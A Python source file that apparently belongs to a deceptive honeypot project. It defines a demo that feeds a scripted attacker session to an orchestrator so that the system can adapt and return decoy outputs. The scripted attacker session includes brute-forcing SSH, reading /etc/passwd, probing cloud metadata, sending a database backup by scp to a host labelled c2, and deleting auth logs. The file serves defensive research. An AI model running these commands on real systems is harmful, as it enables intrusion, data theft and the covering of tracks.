from __future__ import annotations

from dataclasses import dataclass

from sqlalchemy.orm import Session

from cognitive_deception.services.orchestrator import orchestrator


@dataclass
class DemoStep:
    command: str
    typing_duration_ms: float


class DemoScenarioRunner:
    SCENARIO_ID = "demo-adaptive-honeypot-001"

    def run(self, db: Session):
        session = orchestrator.start_session(
            db=db,
            attacker_id="GhostJackal-APT",
            source_ip="198.51.100.42",
            channel="ssh",
        )

        script = [
            DemoStep("nmap -sV 10.10.44.0/24", 2400),
            DemoStep("dirb http://intranet.local/ -w /usr/share/wordlists/dirb/common.txt", 1500),
            DemoStep("hydra -l admin -P creds.txt ssh://10.10.44.7", 3100),
            DemoStep("whoami && id", 800),
            DemoStep("cat /etc/passwd | grep sh$", 1200),
            DemoStep("sqlmap -u http://intranet.local/app?id=2", 3900),
            DemoStep("sudo -l", 900),
            DemoStep("cat /srv/hr/payroll_2026_q1.xlsx", 1800),
            DemoStep("curl -s http://169.254.169.254/latest/meta-data/", 1100),
            DemoStep("scp /tmp/db_backup.tar c2@198.51.100.7:/drop", 3200),
            DemoStep("rm -rf /var/log/auth.log", 1500),
        ]

        steps = []
        for item in script:
            processed = orchestrator.process_command(
                db=db,
                session=session,
                command=item.command,
                typing_duration_ms=item.typing_duration_ms,
            )
            steps.append(processed)

        summary = (
            "Demo attacker progressed from reconnaissance to credential attack, exploit probing, "
            "and exfiltration. System adapted strategy at each stage and generated decoy outputs."
        )

        return self.SCENARIO_ID, summary, steps


demo_runner = DemoScenarioRunner()
